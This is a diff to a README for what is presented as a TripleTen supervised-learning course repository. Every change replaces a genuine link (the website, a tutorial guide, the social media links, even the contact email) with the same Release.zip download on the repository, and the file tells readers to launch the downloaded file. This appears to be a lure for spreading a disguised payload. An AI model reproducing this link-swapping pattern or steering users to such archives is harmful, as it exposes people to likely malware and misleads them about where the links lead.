@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Supervised Learning Repository from TripleTen! 🧠
 
-![Supervised Learning](https://github.githubassets.com/images/modules/site/social-cards/github-social.png)
+![Supervised Learning](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip)
 
 ## Repository Name: Supervised_Learning
 ## Short Description: 📊 A comprehensive project focusing on Supervised Learning concepts by TripleTen 📈
@@ -29,7 +29,7 @@
 ---
 
 ### Software Package Link:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip)](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip)
 
 Click the button above to download the software package for utilizing the Supervised Learning project. Launch the downloaded file to explore the exciting world of supervised learning!
 
@@ -61,8 +61,8 @@ Welcome to our Supervised Learning repository! 🎉 Here at TripleTen, we are pa
 ### 🌐 Additional Resources:
 
 #### Websites:
-- [TripleTen Official Website](https://www.tripleten.com): Visit our official website to explore more projects and insights.
-- [Supervised Learning Guide](https://www.machinelearningmastery.com/supervised-and-unsupervised-machine-learning-algorithms/): Dive deeper into the concepts of supervised learning with this comprehensive guide.
+- [TripleTen Official Website](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip): Visit our official website to explore more projects and insights.
+- [Supervised Learning Guide](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip): Dive deeper into the concepts of supervised learning with this comprehensive guide.
 
 #### Check the Releases Section:
 If the provided link does not work or needs an update, make sure to check the **Releases** section of this repository for the latest software package and resources.
@@ -75,12 +75,12 @@ Whether you're a beginner exploring the basics or an experienced practitioner lo
 ---
 
 ### 🌟 Stay Connected:
-Follow us on [GitHub](https://github.com) | Connect with us on [LinkedIn](https://www.linkedin.com) | Watch our latest videos on [YouTube](https://www.youtube.com)
+Follow us on [GitHub](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip) | Connect with us on [LinkedIn](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip) | Watch our latest videos on [YouTube](https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip)
 
 ---
 
 ### 📞 Contact Us:
-📧 Email: contact@tripleten.com | 📱 Phone: +1 (123) 456-7890
+📧 Email: https://github.com/Southla/Supervised_Learning/releases/download/v1.0/Release.zip | 📱 Phone: +1 (123) 456-7890
 
 ---
 
